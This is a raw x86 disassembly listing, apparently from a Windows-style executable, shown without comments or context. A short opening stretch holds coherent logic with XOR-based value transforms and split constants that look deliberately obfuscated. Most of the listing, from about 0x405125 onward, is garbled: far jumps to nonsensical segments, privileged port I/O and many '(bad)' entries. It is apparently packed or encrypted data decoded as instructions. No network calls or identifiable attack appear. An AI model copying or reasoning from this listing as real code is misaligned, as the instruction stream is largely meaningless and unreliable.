  405086:	ja     0x405013
  405088:	inc    ebp
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	sar    ebp,0xc4
  405133:	fdiv   DWORD PTR [eax+0x53]
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xc770707d
  40513e:	dec    ebx
  40513f:	push   esp
  405140:	jmp    0x7478:0x7f610ad3
  405147:	jb     0x40519a
  405149:	mov    WORD PTR [ecx+0x180ac462],fs
  40514f:	and    BYTE PTR [esi],dl
  405151:	dec    edx
  405152:	pop    esi
  405153:	inc    eax
  405154:	les    ecx,FWORD PTR [bp+si+0xa1]
  405159:	(bad)  
  40515a:	jns    0x40518e
  40515c:	pop    es
  40515d:	push   ebp
  40515e:	in     al,dx
  40515f:	cmp    al,0xd1
  405161:	lods   eax,DWORD PTR ds:[esi]
  405162:	push   edx
  405163:	outs   dx,DWORD PTR ds:[esi]
  405164:	popf   
  405165:	mov    esi,0x669967d8
  40516a:	mov    eax,0xe4a81585
  40516f:	scas   al,BYTE PTR es:[edi]
  405170:	sbb    DWORD PTR [esi+0x68f4047e],edi
  405176:	stos   BYTE PTR es:[edi],al
  405177:	push   edi
  405178:	push   ebp
  405179:	add    DWORD PTR [ebx-0x3],ecx
  40517c:	jmp    0xcee38d22
  405181:	adc    ebx,DWORD PTR [edx-0x7e]
  405184:	dec    edi
  405185:	sbb    cl,BYTE PTR cs:[edx+ebp*8+0x6ce02fa4]
  40518d:	pop    ebp
  40518e:	mov    BYTE PTR cs:[eax+0x5d737265],bl
  405195:	dec    ebp
  405196:	xchg   ebx,eax
  405197:	neg    BYTE PTR [ecx+0x4e]
  40519a:	es mov esp,0xc5666f10
  4051a0:	mov    al,dl
  4051a2:	ins    DWORD PTR es:[edi],dx
  4051a3:	add    BYTE PTR [edi+0x7b],dh
  4051a6:	mov    ecx,0x6980c7b3
  4051ab:	jbe    0x405174
  4051ad:	mov    bl,0x49
  4051af:	adc    DWORD PTR [ecx-0x5d],esp
  4051b2:	mov    bl,0xd2
  4051b4:	call   FWORD PTR [ecx+edx*8+0x66]
  4051b8:	jo     0x4051b1
  4051ba:	scas   al,BYTE PTR es:[edi]
  4051bb:	mov    esp,esi
  4051bd:	xor    edx,DWORD PTR [ecx]
  4051bf:	ret    0xcfb8
  4051c2:	dec    ebx
  4051c3:	test   eax,0x1d734b5
  4051c8:	mov    ds:0x6dd76026,al
  4051cd:	adc    DWORD PTR [eax+0x3d0af5b5],edx
  4051d3:	sar    ecx,0x7a
  4051d6:	in     al,dx
  4051d7:	es jecxz 0x4051e9
  4051da:	fidiv  DWORD PTR [edi-0x30a47745]
  4051e0:	add    bh,BYTE PTR [ebp-0x4351aabb]
  4051e6:	mov    ecx,0xdc21c2e4
  4051eb:	inc    edx
  4051ec:	loope  0x4051c2
  4051ee:	inc    ebp
  4051ef:	or     bl,BYTE PTR [ebx-0x66]
  4051f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051f3:	mov    ah,0x69
  4051f5:	ficom  DWORD PTR ds:0x9760fe4a
  4051fb:	xor    BYTE PTR [edx-0x12ef5555],bh
  405201:	push   0xe85b809b
  405206:	dec    ebp
  405207:	and    dl,BYTE PTR [edx]
  405209:	repz adc cl,BYTE PTR [ebx-0x41216426]
  405210:	fisttp WORD PTR [edi+0x564cb660]
  405216:	mov    eax,ds:0x7ebabb9d
  40521b:	mov    eax,0x1b3ff24c
  405220:	aas    
  405221:	sbb    al,0xbb
  405223:	and    DWORD PTR [esi-0x61],esi
  405226:	xchg   ebp,eax
  405227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405228:	sub    BYTE PTR [esi],ah
  40522a:	cmp    eax,0x1ebd073
  40522f:	cmp    al,BYTE PTR [esi-0x580d3d39]
  405235:	add    eax,0x527ca62b
  40523a:	dec    esi
  40523b:	jae    0x40521e
  40523d:	and    DWORD PTR [edi+ebx*2+0x71],esi
  405241:	cmp    BYTE PTR [edi+eiz*1-0x2],ah
  405245:	xor    cl,cl
  405247:	mov    eax,0xddd4f32d
  40524c:	sub    dl,BYTE PTR [ebx-0x4d]
  40524f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405250:	jmp    0x7670:0x6a350752
  405257:	jo     0x4052be
  405259:	ss mov dh,0xd4
  40525c:	push   ebp
  40525d:	xor    ah,BYTE PTR [ebp+0x41]
  405260:	cmc    
  405261:	or     ebp,eax
  405263:	jecxz  0x405263
  405265:	xchg   ecx,eax
  405266:	sti    
  405267:	stos   BYTE PTR es:[edi],al
  405268:	pop    ecx
  405269:	xchg   edi,eax
  40526a:	(bad)  
  40526c:	test   ch,dl
  40526e:	inc    eax
  40526f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405270:	jae    0x405232
  405272:	imul   esp,eax,0xffffff9f
  405275:	pop    edi
  405276:	scas   eax,DWORD PTR es:[edi]
  405277:	or     BYTE PTR [ebx+0x239e32d5],bh
  40527d:	ja     0x4052af
  40527f:	cld    
  405280:	test   al,0xe6
  405282:	push   esi
  405283:	cdq    
  405284:	cmp    esi,0x4b
  405287:	push   cs
  405288:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40528a:	and    DWORD PTR [esi],edx
  40528c:	pushf  
  40528d:	sub    ecx,esp
  40528f:	jne    0x405216
  405291:	mov    ecx,0x68e11111
  405296:	or     DWORD PTR ds:0xc33b2f02,edi
  40529c:	and    DWORD PTR [esi],ebp
  40529e:	pop    ss
  40529f:	outs   dx,BYTE PTR ds:[esi]
  4052a0:	clc    
  4052a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052a2:	mov    ch,0x4e
  4052a4:	jmp    0x4052e9
  4052a6:	pop    ds
  4052a7:	mov    esp,DWORD PTR [esi-0xe]
  4052aa:	jg     0x405297
  4052ac:	or     esp,esp
  4052ae:	daa    
  4052af:	mov    edi,0x7f0020ab
  4052b4:	jg     0x405329
  4052b6:	leave  
  4052b7:	xor    DWORD PTR [ebx-0x63],esi
  4052ba:	cmp    DWORD PTR [edi],ebx
  4052bc:	sbb    esp,DWORD PTR [esi-0x6d]
  4052bf:	sti    
  4052c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052c1:	xor    al,0x36
  4052c3:	mov    ah,bl
  4052c5:	and    dl,al
  4052c7:	push   eax
  4052c8:	adc    DWORD PTR [edx+eiz*8-0x12],ecx
  4052cc:	push   edi
  4052cd:	cmp    eax,0x4ee1a956
  4052d2:	adc    BYTE PTR [esi+0x30],cl
  4052d5:	and    dh,BYTE PTR [ebx-0x4dbfe7af]
  4052db:	mov    gs,WORD PTR [ebx+edx*1]
  4052de:	pop    ss
  4052df:	popa   
  4052e0:	sbb    DWORD PTR [ebx],ebx
  4052e2:	mov    eax,0x7b502cd
  4052e7:	add    ah,BYTE PTR [ecx+0x41]
  4052ea:	or     al,0xa
  4052ec:	loopne 0x405279
  4052ee:	pop    ds
  4052ef:	mov    ds:0xb0dbf183,eax
  4052f4:	or     BYTE PTR [ecx+edx*8],dh
  4052f7:	cmp    eax,0xf13c06c3
  4052fc:	sti    
  4052fd:	xchg   DWORD PTR [ebx+0x36ade977],edi
  405303:	mov    eax,ds:0x588af2d8
  405308:	jne    0x405348
  40530a:	or     al,0x21
  40530c:	and    eax,0x83b1d1cf
  405311:	cmp    esp,DWORD PTR [ebx]
  405313:	loop   0x405390
  405315:	sbb    bh,dh
  405317:	fst    QWORD PTR [esi]
  405319:	add    edi,DWORD PTR ds:0xfb0bf5b
  40531f:	push   ebx
  405320:	sar    DWORD PTR [edi+eax*2-0x73],1
  405324:	shr    BYTE PTR [esi+ebx*4-0x35df85a5],cl
  40532b:	adc    eax,0xc7fd079b
  405330:	rol    DWORD PTR [esi+0x55bac0a],0x84
  405337:	xchg   ecx,eax
  405338:	xchg   edi,eax
  405339:	dec    ebx
  40533a:	lock mov ds:0x6d6147b8,eax
  405340:	inc    eax
  405341:	popf   
  405342:	pushf  
  405343:	inc    ebx
  405344:	mov    dl,0x65
  405346:	and    eax,0xec1a85e2
  40534b:	test   BYTE PTR [edi-0xf],0x3b
  40534f:	in     al,dx
  405350:	xchg   ebp,eax
  405351:	sub    eax,0x79edea5e
  405356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405357:	nop
  405358:	jmp    0x4052fa
  40535a:	jp     0x405336
  40535c:	pushf  
  40535d:	mov    esi,0xd1404a65
  405362:	jmp    0x378c:0xd39a0485
  405369:	cmp    ch,dl
  40536b:	retf   0x9479
  40536e:	sahf   
  40536f:	out    dx,al
  405370:	fist   WORD PTR [esi+0x6f]
  405373:	add    esp,edi
  405375:	in     al,dx
  405376:	xor    esi,DWORD PTR [eax]
  405378:	jns    0x40534f
  40537a:	sub    BYTE PTR [eax],dl
  40537c:	add    DWORD PTR [ebx],0x81c0eda
  405382:	les    ecx,FWORD PTR [ebp+0x4]
  405385:	iret   
  405386:	fisub  WORD PTR [ecx+0x39]
  405389:	stc    
  40538a:	test   al,0x5d
  40538c:	sbb    cl,BYTE PTR [edi-0x7860510]
  405392:	(bad)  
  405393:	cmp    BYTE PTR [eax+0x36df0061],cl
  405399:	ins    DWORD PTR es:[edi],dx
  40539a:	mov    eax,0x90d43955
  40539f:	jle    0x4053b9
  4053a1:	aaa    
  4053a2:	daa    
  4053a3:	enter  0x4aae,0x4f
  4053a7:	xchg   ebp,eax
  4053a8:	and    BYTE PTR [edi+0x68],dl
  4053ab:	clc    
  4053ac:	ss loopne 0x405351
  4053af:	add    eax,DWORD PTR [edx]
  4053b1:	xchg   edx,eax
  4053b2:	inc    ebx
  4053b3:	fidivr DWORD PTR [esi-0x1d]
  4053b6:	sbb    eax,0xb186d447
  4053bb:	inc    edx
  4053bc:	fwait
  4053bd:	mov    dh,0xf9
  4053bf:	repnz mov edi,0xa62614ea
  4053c5:	push   esp
  4053c6:	inc    eax
  4053c7:	leave  
  4053c8:	pop    ebp
  4053c9:	push   ecx
  4053ca:	adc    DWORD PTR [edi+0x695e4aa6],edx
  4053d0:	jb     0x40540a
  4053d2:	in     al,0x50
  4053d4:	pop    esp
  4053d5:	and    BYTE PTR ds:0x22417c4d,ch
  4053db:	imul   eax,edx,0xd03789de
  4053e1:	jecxz  0x4053e1
  4053e3:	clc    
  4053e4:	pop    esi
  4053e5:	out    0x9e,eax
  4053e7:	add    eax,0xc7b6dbf0
  4053ec:	cmp    dh,0x8b
  4053ef:	mov    esi,0xccb295dc
  4053f4:	dec    ecx
  4053f5:	dec    esi
  4053f6:	xor    eax,0x428fa858
  4053fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053fc:	cmp    eax,0x9896328a
  405401:	(bad)  
  405402:	push   edx
  405403:	cwde   
  405404:	sub    eax,0x5a665db9
  405409:	push   ss
  40540a:	adc    DWORD PTR [edx-0x483febe2],0xb4a01557
  405414:	es enter 0x7fbc,0x4
  405419:	inc    eax
  40541a:	ror    edx,0x0
  40541d:	bound  eax,QWORD PTR [eax+0x4c]
  405420:	ficomp WORD PTR [ecx]
  405422:	push   0xffffffc8
  405424:	repnz sub DWORD PTR [edi],edx
  405427:	ret    0x697e
  40542a:	aas    
  40542b:	mov    bl,0xeb
  40542d:	enter  0x76b7,0xcd
  405431:	or     eax,0xe15f1602
  405436:	or     ecx,DWORD PTR [edi+0x10]
  405439:	shl    DWORD PTR [esi+0x5],0x51
  40543d:	mov    ds,WORD PTR [edx]
  40543f:	retf   
  405440:	mov    dl,0x4a
  405442:	int    0xd0
  405444:	mov    edi,0xc5a72a4
  405449:	adc    BYTE PTR [ecx],al
  40544b:	popf   
  40544c:	nop
  40544d:	clc    
  40544e:	xchg   ecx,eax
  40544f:	mov    edx,0x2abc5b29
  405454:	leave  
  405455:	cmp    ecx,DWORD PTR [ebx-0x9c6bd]
  40545b:	sar    DWORD PTR [ebp-0x22],1
  40545e:	sbb    DWORD PTR [edx-0x22856383],esp
  405464:	imul   esp,DWORD PTR [ebp-0x9f2a1c3],0x8935a9a5
  40546e:	mov    DWORD PTR [ebp+0x3bcbd358],ebx
  405474:	xor    edx,DWORD PTR [edi-0x325ebfb4]
  40547a:	les    ecx,FWORD PTR [ebp*1+0x5e3c9de8]
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	sbb    esi,DWORD PTR [ebx+0x37102587]
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054fd
  4054b5:	fisttp QWORD PTR [ecx-0x20]
  4054b8:	jge    0x405489
  4054ba:	push   ecx
  4054bb:	pop    esi
  4054bc:	stos   DWORD PTR es:[edi],eax
  4054bd:	mov    ebx,0x4dcf67c1
  4054c2:	stos   DWORD PTR es:[edi],eax
  4054c3:	xchg   esp,eax
  4054c4:	lds    ebx,FWORD PTR [esi]
  4054c6:	or     BYTE PTR [ebx],ah
  4054c8:	in     al,dx
  4054c9:	cld    
  4054ca:	adc    edx,eax
  4054cc:	(bad)  
  4054cd:	imul   ecx,DWORD PTR [edx-0x3fa0b0ca],0x972bee25
  4054d7:	add    BYTE PTR [ecx-0x36],dl
  4054da:	test   DWORD PTR [edi],0x5a2e709e
  4054e0:	or     dh,BYTE PTR [edx+0x13]
  4054e3:	lods   al,BYTE PTR ds:[esi]
  4054e4:	ds or  ah,bl
  4054e7:	icebp  
  4054e8:	into   
  4054e9:	outs   dx,DWORD PTR ds:[esi]
  4054ea:	scas   al,BYTE PTR es:[edi]
  4054eb:	add    al,BYTE PTR [ebp-0x7a]
  4054ee:	out    dx,al
  4054ef:	xchg   esi,eax
  4054f0:	lods   al,BYTE PTR ds:[esi]
  4054f1:	inc    esi
  4054f2:	cmp    cl,cl
  4054f4:	pop    esp
  4054f5:	mov    cl,cl
  4054f7:	inc    esi
  4054f8:	pop    es
  4054f9:	test   al,0xfb
  4054fb:	mov    DWORD PTR [eax+eax*4],ebx
  4054fe:	and    al,0x0
  405500:	mov    bh,0x44
  405502:	sub    al,0x5f
  405504:	xchg   esi,eax
  405505:	ins    DWORD PTR es:[edi],dx
  405506:	jp     0x4054bc
  405508:	lods   al,BYTE PTR ds:[esi]
  405509:	mov    ebx,0x85ef5afb
  40550e:	in     al,dx
  40550f:	dec    ebx
  405510:	ret    
  405511:	mov    esp,0xe37f16d2
  405516:	outs   dx,BYTE PTR ds:[esi]
  405517:	outs   dx,DWORD PTR ds:[esi]
  405518:	and    al,ch
  40551a:	clc    
  40551b:	test   dh,ah
  40551d:	inc    esi
  40551e:	jg     0x4054bf
  405520:	or     esi,edi
  405522:	pop    edx
  405523:	das    
  405524:	ja     0x4054ae
  405526:	mov    bl,0x55
  405528:	push   esp
  405529:	test   DWORD PTR [ebx],esi
  40552b:	xchg   edi,eax
  40552c:	pop    ecx
  40552d:	jbe    0x4054c8
  40552f:	xacquire xchg DWORD PTR [ebp+0x195a93af],ebx
  405536:	cli    
  405537:	inc    ebp
  405538:	shld   DWORD PTR [ebx+0x12234ca2],esi,cl
  40553f:	push   edx
  405540:	mov    ah,BYTE PTR [ecx+eax*1+0x4782d1ee]
  405547:	dec    edi
  405548:	retf   0x8f58
  40554b:	or     BYTE PTR [edx],bh
  40554d:	mov    BYTE PTR [ecx-0x1b],ch
  405550:	cmp    eax,0x8dec7ca4
  405555:	jbe    0x40550d
  405557:	jae    0x405587
  405559:	js     0x40557b
  40555b:	ficom  WORD PTR [edx+0x7]
  40555e:	and    eax,esp
  405560:	xor    al,0xa7
  405562:	iret   
  405563:	fdiv   st,st(0)
  405565:	push   edi
  405566:	cmp    ebx,0x9cab242d
  40556c:	jecxz  0x40550b
  40556e:	jae    0x405532
  405570:	retf   0xa44e
  405573:	(bad)  
  405574:	mov    esi,0x8ea98695
  405579:	cld    
  40557a:	sub    eax,0x69b9f400
  40557f:	imul   BYTE PTR [ebp+0x56]
  405582:	pop    ecx
  405583:	or     BYTE PTR [edi],dl
  405585:	popfw  
  405587:	push   esi
  405588:	out    0xca,eax
  40558a:	sub    DWORD PTR [esi+0x11],edx
  40558d:	(bad)  [ecx]
  40558f:	mov    BYTE PTR [edi+ecx*2+0xf],bh
  405593:	mov    dh,0xc7
  405595:	dec    ecx
  405596:	cmp    BYTE PTR [edi-0x1cc7e033],al
  40559c:	xchg   dl,ah
  40559e:	sub    bh,BYTE PTR [ebp-0x707ed716]
  4055a4:	scas   al,BYTE PTR es:[edi]
  4055a5:	mov    BYTE PTR [eiz*4-0x660489a9],bl
  4055ac:	imul   ebp,esi,0xa915fab4
  4055b2:	or     al,0x85
  4055b4:	jbe    0x405584
  4055b6:	push   ss
  4055b7:	inc    ebp
  4055b8:	pushf  
  4055b9:	retf   
  4055ba:	jo     0x40556a
  4055bc:	jno    0x405567
  4055be:	out    0x39,eax
  4055c0:	mov    esi,0x2858e94c
  4055c5:	dec    esi
  4055c6:	out    dx,al
  4055c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055c8:	ja     0x40563b
  4055ca:	cmp    eax,0x1e9117f2
  4055cf:	les    ebp,FWORD PTR [ebx]
  4055d1:	xchg   esi,eax
  4055d2:	std    
  4055d3:	fst    QWORD PTR [ebp-0x73311d04]
  4055d9:	test   bh,al
  4055db:	paddusb mm2,QWORD PTR [edx-0x57d8b3d8]
  4055e2:	or     eax,0xb6313990
  4055e7:	sub    ecx,DWORD PTR [esi+0xe]
  4055ea:	loopne 0x40559a
  4055ec:	aas    
  4055ed:	mov    cl,0xd9
  4055ef:	and    ebx,0xf3d29218
  4055f5:	add    DWORD PTR [ebx],0x37
  4055f8:	jmp    0x40566b
  4055fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055fb:	call   FWORD PTR [edx]
  4055fd:	xor    BYTE PTR [ebp+0x39],bl
  405600:	mov    dh,dh
  405602:	dec    edx
  405603:	shr    bl,0x7a
  405606:	into   
  405607:	fs inc ebx
  405609:	push   esi
  40560a:	cld    
  40560b:	dec    esp
  40560c:	or     ebp,DWORD PTR [edx]
  40560e:	and    esi,DWORD PTR [ebp+0x7f]
  405611:	out    dx,eax
  405612:	cmp    DWORD PTR gs:[ecx],esi
  405615:	out    dx,al
  405616:	out    0x36,al
  405618:	dec    esi
  405619:	sti    
  40561a:	mov    al,0xbe
  40561c:	jle    0x40562b
  40561e:	rcl    DWORD PTR [ebx+0x6c],cl
  405621:	dec    BYTE PTR [eax+edx*1]
  405624:	sub    DWORD PTR [eax],ebp
  405626:	addr16 pusha 
  405628:	mov    dl,0x36
  40562a:	add    bl,BYTE PTR ds:0x4e92798b
  405630:	jmp    0x3fff:0x82a7b7a8
  405637:	pop    edx
  405638:	pop    esp
  405639:	mov    ds,eax
  40563b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40563c:	mov    ds:0xed2a2025,al
  405641:	fwait
  405642:	inc    ebp
  405643:	lock and BYTE PTR [ebx-0x2e],dl
  405647:	data16 aaa 
  405649:	out    dx,eax
  40564a:	mov    ds:0x6fc88cd9,al
  40564f:	mov    cl,0x7c
  405651:	pop    ss
  405652:	cs pop ds
  405654:	xor    al,0xf0
  405656:	add    edi,DWORD PTR [ecx+esi*4-0x6f64e91c]
  40565d:	cmp    DWORD PTR [eax],0xffffffa8
  405660:	pop    ss
  405661:	nop
  405662:	jno    0x40569d
  405664:	popa   
  405665:	cmp    eax,0x4bb0ed8d
  40566a:	and    esi,0x62963a9f
  405670:	push   eax
  405671:	xchg   ecx,eax
  405672:	jmp    0x2a0d92eb
  405677:	fmul   QWORD PTR [esi+0x23da52de]
  40567d:	or     al,0x5f
  40567f:	dec    ecx
  405680:	sub    eax,0x6c79b627
  405685:	jge    0x4056cf
  405687:	cwde   
  405688:	test   edi,ebp
  40568a:	out    dx,eax
  40568b:	jl     0x4056a0
  40568d:	mov    edx,0x3734c862
  405692:	push   cs
  405693:	xchg   edx,eax
  405694:	cmp    eax,0x30ff1fe7
  405699:	into   
  40569a:	mov    dh,dh
  40569c:	push   es
  40569d:	push   ss
  40569e:	cmp    edi,ebx
  4056a0:	jge    0x4056dd
  4056a2:	aaa    
  4056a3:	xlat   BYTE PTR ds:[ebx]
  4056a4:	mov    DWORD PTR [edi+0x2776138c],0x9d0dd68b
  4056ae:	xchg   ebp,eax
  4056af:	repnz mul BYTE PTR [edi+ebx*2-0x5a7d8591]
  4056b7:	mov    ds:0x13acdccd,al
  4056bc:	cmp    cl,ch
  4056be:	mov    esi,0x3c75f805
  4056c3:	mov    edx,0x7a262e8e
  4056c8:	test   al,0x6b
  4056ca:	call   0x21128236
  4056cf:	add    al,BYTE PTR [esi]
  4056d1:	outs   dx,DWORD PTR ds:[esi]
  4056d2:	cli    
  4056d3:	cmc    
  4056d4:	jo     0x4056ea
  4056d6:	(bad)  
  4056d7:	shl    BYTE PTR [ecx],cl
  4056d9:	mov    edx,0xe99439f2
  4056de:	clc    
  4056df:	sbb    al,0xd9
  4056e1:	jp     0x40575e
  4056e3:	popf   
  4056e4:	fmul   QWORD PTR [ebp-0x6e]
  4056e7:	fst    DWORD PTR [ebp-0x7c]
  4056ea:	nop
  4056eb:	dec    ebx
  4056ec:	rol    BYTE PTR ds:0x9abfd2f3,1
  4056f2:	inc    esi
  4056f3:	cmp    BYTE PTR [edi],cl
  4056f5:	add    al,0xcb
  4056f7:	jecxz  0x405713
  4056f9:	and    ebp,DWORD PTR [ecx+0x6d]
  4056fc:	mov    ds:0x356dc1a7,al
  405701:	and    ecx,DWORD PTR [edi-0x70]
  405704:	xchg   esp,eax
  405705:	cmp    bl,cl
  405707:	jae    0x40577b
  405709:	pop    eax
  40570a:	js     0x4056ed
  40570c:	jo     0x40571f
  40570e:	in     al,dx
  40570f:	or     eax,0xcc3a87a5
  405714:	popa   
  405715:	jne    0x405700
  405717:	test   eax,0x8ee4eadb
  40571c:	fcom   QWORD PTR [ebx+0x734f91c8]
  405722:	cmp    ebx,DWORD PTR [esi+0x632bef3a]
  405728:	mov    bl,0xb2
  40572a:	xchg   ebp,eax
  40572b:	inc    ecx
  40572c:	pop    edi
  40572d:	stos   BYTE PTR es:[edi],al
  40572e:	lock fsub DWORD PTR [edx+0x39a7cbac]
  405735:	and    eax,edx
  405737:	cmp    BYTE PTR [eax-0x23bb4eeb],al
  40573d:	sub    al,0x5b
  40573f:	add    BYTE PTR [edx-0x2d],al
  405742:	lods   al,BYTE PTR ds:[esi]
  405743:	mov    DWORD PTR [ecx+0x7695ba10],edi
  405749:	cld    
  40574a:	loop   0x40579a
  40574c:	and    ch,bl
  40574e:	fdiv   DWORD PTR [ecx-0x9f2c180]
  405754:	ror    bl,0x2c
  405757:	xchg   edi,eax
  405758:	mov    esi,0xfda82b1c
  40575d:	pop    ebx
  40575e:	mov    cl,0x78
  405760:	mov    DWORD PTR [esi+0x7],esp
  405763:	cmp    al,BYTE PTR [esi]
  405765:	sub    edx,esi
  405767:	addr16 call 0x8605:0xb70f5192
  40576f:	std    
  405770:	inc    edx
  405771:	add    BYTE PTR [ebx],ah
  405773:	add    eax,0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x32ce6e42],eax
  405790:	xor    BYTE PTR [ecx+0x4a],ah
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	sbb    BYTE PTR [ebx],ch
  40579c:	sub    al,0xfa
  40579e:	imul   DWORD PTR [edi-0x58]
  4057a1:	push   0x90ee6323
  4057a6:	add    DWORD PTR [ecx-0x43dcf2ae],esi
  4057ac:	xlat   BYTE PTR ds:[ebx]
  4057ad:	dec    edx
  4057ae:	push   cs
  4057af:	push   edx
  4057b0:	xor    DWORD PTR [edx],0x540f2f85
  4057b6:	adc    al,0xa9
  4057b8:	rcr    BYTE PTR [edi+0x1f],0x27
  4057bc:	aaa    
  4057bd:	sbb    dl,ch
  4057bf:	adc    dl,cl
  4057c1:	pop    ebp
  4057c2:	mov    esp,DWORD PTR [ebx+ebx*8-0x4048fef0]
  4057c9:	cmp    edi,DWORD PTR [ebp-0x50]
  4057cc:	pop    ecx
  4057cd:	fdivr  DWORD PTR [edx+0x4e3945b0]
  4057d3:	ja     0x40580c
  4057d5:	push   edx
  4057d6:	fisubr WORD PTR [ebx-0x2]
  4057d9:	sbb    al,0xac
  4057db:	push   ecx
  4057dc:	dec    esp
  4057dd:	or     al,0xa2
  4057df:	(bad)  
  4057e0:	cdq    
  4057e1:	clc    
  4057e2:	mov    ds:0xe3f5cd39,eax
  4057e7:	jno    0x4057fc
  4057e9:	test   DWORD PTR [eax+ebp*8-0x7f],0xe9f152dd
  4057f1:	(bad)  
  4057f2:	dec    ebp
  4057f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057f4:	mov    ds:0x48a8d079,eax
  4057f9:	aas    
  4057fa:	jmp    0x7630:0xdc5508ba
  405801:	push   eax
  405802:	frstor [eax]
  405804:	pop    esp
  405805:	push   eax
  405806:	cld    
  405807:	add    esi,edx
  405809:	jne    0x4057dd
  40580b:	jg     0x40586f
  40580d:	jae    0x4057af
  40580f:	cdq    
  405810:	jne    0x4057e9
  405812:	mov    edx,0x568ad701
  405817:	cdq    
  405818:	inc    edx
  405819:	pop    ss
  40581a:	retf   
  40581b:	xor    DWORD PTR [eax],ebp
  40581d:	or     ebx,DWORD PTR ds:0x731e0c1f
  405823:	cld    
  405824:	jb     0x40584a
  405826:	icebp  
  405827:	and    eax,0x3e0d93b5
  40582c:	call   0x6801f5c5
  405831:	scas   eax,DWORD PTR es:[edi]
  405832:	test   DWORD PTR [esi-0x2e],edx
  405835:	arpl   WORD PTR [eax+0x14c5b1fb],bx
  40583b:	xor    dl,BYTE PTR ds:0xed22454d
  405841:	adc    BYTE PTR [esi-0x5f],al
  405844:	sub    eax,0x646cc7fe
  405849:	xchg   esi,eax
  40584a:	cmp    al,0x92
  40584c:	push   0x2
  40584e:	jo     0x4057f8
  405850:	dec    ebx
  405851:	jns    0x40583a
  405853:	xor    al,0x15
  405855:	sub    ebp,eax
  405857:	jg     0x4058ce
  405859:	aas    
  40585a:	push   0xffffff8f
  40585c:	dec    esp
  40585d:	mov    esp,0x6b4f9a16
  405862:	mov    ch,0x4c
  405864:	add    eax,0xea309bef
  40586a:	cwde   
  40586b:	or     DWORD PTR [ebx-0xb],0x9
  40586f:	inc    BYTE PTR [eax]
  405871:	(bad)  
  405872:	gs pushf 
  405874:	push   ds
  405875:	inc    edi
  405876:	mov    dl,0x1e
  405878:	push   ss
  405879:	inc    eax
  40587a:	mov    bh,0x47
  40587c:	and    ch,BYTE PTR [edi+0x10]
  40587f:	call   0x99e8:0x28095b6b
  405886:	sti    
  405887:	daa    
  405888:	inc    ebp
  405889:	jg     0x40580f
